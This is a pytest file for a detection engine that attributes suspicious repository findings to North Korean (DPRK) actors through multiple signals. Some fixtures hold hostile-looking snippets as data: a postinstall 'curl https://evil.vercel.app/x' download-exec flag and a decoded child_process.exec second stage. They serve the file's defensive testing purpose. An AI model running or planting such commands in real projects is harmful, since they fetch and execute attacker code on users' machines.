"""Tests for the multi-signal DPRK attribution engine (git_warden.dprk)."""

from __future__ import annotations

from git_warden.dprk import assess, is_dprk_actor_key


def _flag(rule="eval-decoded", category="obfuscation", snippet="", file="x.js", line=1):
    return {"file": file, "line": line, "category": category, "rule": rule, "snippet": snippet}


def test_no_signals_is_unattributed():
    a = assess([_flag(rule="r", category="c")], None, set())
    assert a.tier == "unattributed"
    assert not a.attributed and a.tag is None


def test_single_vector_is_possible_not_dprk():
    # A lone Contagious-Interview vector is a LEAD, not an attribution.
    a = assess([_flag(rule="eval-decoded")], None, set())
    assert a.signals == ["tradecraft_vector"]
    assert a.tier == "possible"
    assert not a.attributed
    assert a.tag == "dprk-consistent-tradecraft"


def test_vector_plus_infra_overlap_is_probable_dprk():
    flags = [_flag(rule="eval-decoded"),
             _flag(rule="npm-postinstall", category="download_exec",
                   snippet="curl https://evil.vercel.app/x")]
    a = assess(flags, None, {"evil.vercel.app"})
    assert set(a.signals) == {"tradecraft_vector", "c2_infra_overlap"}
    assert a.tier == "probable"
    assert a.attributed and a.tag == "dprk"
    assert "evil.vercel.app" in a.c2


def test_decoded_family_plus_vector_is_confirmed():
    flags = [_flag(rule="eval-decoded",
                   snippet="second-stage decode: require('child_process').exec(...)")]
    a = assess(flags, None, set())
    assert "decoded_family" in a.signals and "tradecraft_vector" in a.signals
    assert a.tier == "confirmed" and a.attributed


def test_osm_tag_is_corroboration_not_a_counting_signal():
    # OSM already tagging DPRK does NOT, by itself, meet the 2-signal bar.
    a = assess([_flag(rule="eval-decoded")], "dprk (north korea)", set())
    assert a.osm_corroborated is True
    assert a.tier == "possible"          # still only ONE independent evidence signal
    assert not a.attributed
    assert is_dprk_actor_key("dprk (north korea)") and not is_dprk_actor_key("acme")


def test_infra_overlap_requires_host_in_passed_set():
    # c2 overlap requires the host to be in the PASSED infra set (the caller passes
    # it with the repo itself excluded, so a repo never self-corroborates).
    flags = [_flag(rule="eval-decoded"),
             _flag(category="download_exec", rule="x", snippet="https://h.top/x")]
    assert "c2_infra_overlap" not in assess(flags, None, set()).signals
    assert "c2_infra_overlap" in assess(flags, None, {"h.top"}).signals
